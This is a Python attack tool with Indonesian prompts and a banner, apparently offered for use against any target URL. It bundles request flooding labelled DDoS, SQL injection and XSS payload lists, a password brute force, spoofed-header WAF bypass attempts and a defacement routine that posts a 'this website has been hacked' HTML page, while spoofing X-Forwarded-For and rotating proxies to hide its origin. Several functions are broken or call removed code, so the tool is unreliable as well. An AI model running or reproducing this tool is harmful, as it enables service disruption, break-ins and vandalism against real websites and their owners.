import requests
import random
import string
import logging
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import re

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'
print(f"""{G}
-------------------------{R}######{G}-------------------------
---------------------{R}######{G}--{R}######{G}---------------------
------------------{R}###{G}--------------{R}###{G}------------------
---------------{R}####{G}------------------{R}####{G}---------------
--------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
--------------{R}##{G}------------------------{R}##{G}--------------
-------------{R}#{G}----------------------------{R}#{G}-------------
------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
-------------------------{R}######{G}-------------------------
-----------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
---------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
--------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
-----------------{R}######################{G}-----------------
-------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
--------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
---------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
-----------{R}##{G}------------------------------{R}##{G}-----------
-------{R}#####{G}--------------------------------{R}#####{G}-------
----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
--------------------------------------------------------
--------------------------------------------------------
----------------------{R}#{G}----------{R}#{G}----------------------
----------------------{R}#{G}----------{R}#{G}----------------------
---------------------------------{R}#{G}----------------------""")
print("Printing banner...")
print(f"{R}                                                                                   {N}")
print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
print(f"{Y}        `---'                                                                       {N}")
print("Banner printed.")  

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.))'  
        r'(?::\d+)?'  
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

def random_delay(min_delay=1, max_delay=5):
    delay = random.randint(min_delay, max_delay)
    print(f"Menunggu selama {delay} detik...")
    time.sleep(delay)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        if response.status_code == 200:
            print(f"Permintaan berhasil dikirim ke {url}")
        else:
            print(f"Permintaan gagal: Status Code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan: {e}")
        return None

def xss_attack(url):
    options = Options()
    options.headless = True  
    driver = webdriver.Chrome(options=options)
    driver.get(url)

    payloads = [
        "<script>alert('XSS Test');</script>",  # Standard XSS
        "<img src='x' onerror='alert(1)' />",  # Image-based XSS
        "<svg/onload=alert(1)>",  # SVG XSS
        "%3Cscript%3Ealert('XSS%20Encoded')%3C%2Fscript%3E",  # URL-encoded XSS
    ]
    
    for payload in payloads:
        driver.execute_script(payload)
        print(f"Melakukan serangan XSS dengan payload: {payload}")
    
    driver.quit()

def sql_injection(url, session):
    payloads = [
        "' OR '1'='1'; --", 
        "' UNION SELECT null, username, password FROM users --", 
        "' AND 1=1 --", 
        "admin' OR 1=1--", 
        "%27%20OR%20%271%27%3D%271%27%3B%20--",  # URL Encoded
    ]
    for payload in payloads:
        send_request(url + "?id=" + payload, session)

def brute_force_login(url, session):
    username = "admin"
    password_list = ["12345", "password", "admin"]
    for password in password_list:
        payload = {"username": username, "password": password}
        send_request(url + "/login", session)

def flooding_ddos(url, session):
    for _ in range(1000):  # Flood server with requests
        send_request(url, session)

def csrf_attack(url, session):
    csrf_token = "dummy_csrf_token"  
    payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
    send_request(url + "/login", session)

def bypass_waf(url, session):
    headers = {
        'X-Real-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Injected-By': 'attacker'
    }
    try:
        response = session.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print("Custom headers berhasil melewati WAF!")
    except requests.exceptions.RequestException as e:
        print(f"Gagal dengan custom headers: {e}")

def deface_payload(url, session):
    payload = """
    <html>
        <head>
            <title>Website Anda Telah Diuji Keamanan</title>
            <style>
                body {
                    background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
                    font-family: Arial, sans-serif;
                    color: white;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                }
                h1 {
                    font-size: 60px;
                    text-shadow: 2px 2px 5px #00008B;
                    margin-top: 20%;
                }
                p {
                    font-size: 20px;
                    margin: 20px auto;
                    width: 70%;
                    text-shadow: 1px 1px 3px #4682B4;
                }
            </style>
        </head>
        <body>
            <h1>cyber-heroes</h1>
            <p>website ini telah di hack.</p>
        </body>
    </html>
    """
    data = {"content": payload} # ini tampilan payload nya jangan di ubah lah bang😭🙏
    try:
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Deface berhasil dikirim ke {url}")
            print(f"{G}Deface berhasil! Periksa URL target.{N}")
        else:
            logging.error(f"Deface gagal, status code: {response.status_code}")
            print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Deface gagal: {e}")
        print(f"{R}Deface gagal: {e}{N}")

def main():
    url = input("Masukkan URL target: ")
    if not is_valid_url(url):
        print("URL yang dimasukkan tidak valid.")
        return

    session = create_session()
    logging.info(f"Mulai melakukan serangan pada {url}")

    while True:
        print(f"{Y}Pilih jenis serangan:{N}")
        print(f"{R}1{G}. Flooding (DDoS)")
        print(f"{R}2{G}. Slowloris ( {R}dihapus{G} )")
        print(f"{R}3{G}. SQL Injection")
        print(f"{R}4{G}. XSS")
        print(f"{R}5{G}. CSRF")
        print(f"{R}6{G}. CAPTCHA Bypass ( {R}dihapus{G} )")
        print(f"{R}7{G}. Brute Force Login")
        print(f"{R}8{G}. Bypass WAF")
        print(f"{R}9{G}. Deface Payload")
        print(f"{R}0{G}. Keluar")

        choice = input("Pilih opsi: ")

        if choice == "1":
            flooding_ddos(url, session)  
        elif choice == "2":
            slowloris_attack(url, session)  
        elif choice == "3":
            sql_injection(url, session)  
        elif choice == "4":
            xss_attack(url)  
        elif choice == "5":
            csrf_attack(url, session)  
        elif choice == "6":
            captcha_bypass(url, session)  
        elif choice == "7":
            brute_force_login(url, session)  
        elif choice == "8":
            bypass_waf(url, session)  
        elif choice == "9":
            deface_payload(url, session)  
        elif choice == "0":
            print(f"{G}Keluar dari program...{N}")
            break  

if __name__ == "__main__":
    main()
